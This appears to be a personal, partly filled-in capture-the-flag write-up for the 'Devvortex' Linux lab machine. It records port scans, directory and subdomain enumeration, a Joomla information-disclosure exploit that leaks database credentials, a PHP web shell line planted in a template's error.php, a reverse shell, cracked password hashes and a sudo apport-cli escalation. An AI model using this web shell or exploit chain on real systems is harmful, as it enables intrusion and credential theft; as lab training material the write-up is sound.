# [Devortex] - [Linux] - [Easy]

## Target: 10.129.229.146

## Recon

### Nmap
[nmap -p- --min-rate 10000 -oA nmap_allport 10.129.229.146                                    │
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-21 21:27 +0200                              │
Nmap scan report for 10.129.229.146                                                            │
Host is up (0.096s latency).                                                                   │
Not shown: 65533 closed tcp ports (reset)                                                      │
PORT   STATE SERVICE                                                                           │
22/tcp open  ssh                                                                               │
80/tcp open  http     

nmap -p 22,80 -sV -sC -oA nmap_detailed 10.129.229.146                                       │
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-21 21:28 +0200                              │
Nmap scan report for 10.129.229.146                                                            │
Host is up (0.053s latency).                                                                   │
                                                                                               │
PORT   STATE SERVICE VERSION                                                                   │
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)              │
| ssh-hostkey:                                                                                 │
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)                                 │
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                                │
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                              │
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                     │
|_http-title: Did not follow redirect to http://devvortex.htb/                                 │
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                    │
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
]

### Open Ports Summary

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 |
| 80   | HTTP    | nginx 1.18.0                    |

### Findings
- [ ] Finding 1
- [ ] Finding 2

## Web (Port 80)
![[Screenshot 2026-04-21 at 21-30-16 DevVortex.png]]
### Technology
- Server: 
- Framework:
- CMS:

### Directory Brute Force
[ gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-me│::1     localhost ip6-localhost ip6-loopback
dium-directories.txt -t 50
Starting gobuster in directory enumeration mode                                                │
===============================================================                                │
images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]          │
cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]           │
components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]      │
includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]        │
modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]         │
language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]        │
templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]       │
libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]       │
tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]             │
media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]           │
plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]         │
administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]   │
api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]             │
home                 (Status: 200) [Size: 23221]                                               │
layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]         │
cli                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cli/] ]

### Interesting Endpoints
- /admin - Login page
- /api - API endpoint
ffuf -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/│
DNS/subdomains-top1million-5000.txt -fs 9265  
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 9101ms]
![[Pasted image 20260421220913.png]]![[Screenshot 2026-04-21 at 22-06-38 Devvortex.png]]
### Credentials Found
 ruby 51334.py http://dev.devvortex.htb                                                       │
Users                                                                                          │
[649] lewis (lewis) - lewis@devvortex.htb - Super Users                                        │
[650] logan paul (logan) - logan@devvortex.htb - Registered                                    │
                                                                                               │
Site info                                                                                      │
Site name: Development                                                                         │
Editor: tinymce                                                                                │
Captcha: 0                                                                                     │
Access: 1                                                                                      │
Debug status: false                                                                            │
                                                                                               │
Database info                                                                                  │
DB type: mysqli                                                                                │
DB host: localhost                                                                             │
DB user: lewis                                                                                 │
DB password: P4ntherg0t1n5r3c0n##                                                              │
DB name: joomla                                                                                │
DB prefix: sd4fg_                                                                              │
DB encryption 0                                                                                │

| lewis    | P4ntherg0t1n5r3c0n## | exploit     |
| -------- | -------------------- | ----------- |
| Username | Password             | Where Found |

## Foothold
![[Screenshot 2026-04-21 at 22-47-12 Home Dashboard - Development - Administration.png]]
### Vulnerability
[]

![[Screenshot_2026-04-21_22-56-52.png]]
### Exploit
[system($_GET['cmd']); in error.php]
![[Screenshot 2026-04-21 at 23-17-19 Templates Customise (Atum) - Development - Administration.png]]
### Shell Obtained
- User: www-data
- Method: reverse shell via RCE

## User

### Lateral Movement
[mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
mysql> SELECT username, password FROM sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+]
| Username | Password             | Where Found |
| logan             tequieromucho   mysql tables

![[Screenshot_2026-04-22_10-46-27.png]]
### User Flag
user.txt: [e2302e9d8302d97c479136842ba111cd]

## Privilege Escalation

### Enumeration Findings
- sudo -l: [logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli]
- SUID: [findings]
- Cron: [findings]

### Exploit
[Commands and output]
![[Screenshot_2026-04-22_10-58-56.png]]
### Root Flag
root.txt: [46e82443537bf2b252e74dc87527d8f1]

## Loot
- Credentials: 
- SSH keys:
- Hashes:

## Lessons Learned
1. 
2.
3.
